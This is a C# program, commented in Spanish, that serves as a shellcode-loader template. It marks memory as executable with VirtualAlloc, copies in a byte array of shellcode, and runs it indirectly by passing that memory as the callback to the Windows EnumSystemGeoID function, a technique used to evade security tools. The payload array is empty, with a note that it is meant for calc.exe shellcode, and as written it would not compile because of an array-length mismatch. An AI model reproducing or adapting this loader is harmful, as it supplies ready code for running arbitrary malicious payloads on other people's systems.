using System;
using System.Runtime.InteropServices;



//Código que a través de callback (lin. 25 y 41), no directamente, ejecute el shellcode que le introduzcamos en el array de bytes (ahora vacío claro)


namespace CallBackShellcode
{
    class Program
    {
        static void Main()
        { 
            // calc.exe x64
            byte[] shellcode64 = new byte[295] {
 };

            IntPtr BaseAddress = IntPtr.Zero;
            // Allocate memory
            IntPtr funcAddr = VirtualAlloc(BaseAddress, (uint)shellcode64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            // Copy shellcode
            Marshal.Copy(shellcode64, 0, funcAddr, shellcode64.Length);
            // Execution via Callback
            EnumSystemGeoID(GEOCLASS_NATION, 0, funcAddr);



        }
        // found here: https://stackoverflow.com/questions/2379028/how-to-programatically-retrieve-the-location-as-displayed-in-the-regional-and
        private const int GEOCLASS_NATION = 16;

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        // found here: https://github.com/lstratman/Win32Interop/blob/master/Kernel32/Methods.cs
        [DllImport("kernel32.dll", EntryPoint = "EnumSystemGeoID")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemGeoID(uint GeoClass, int ParentGeoId, IntPtr lpGeoEnumProc); //EnumGeoInfoProc Callback Function
    }
}
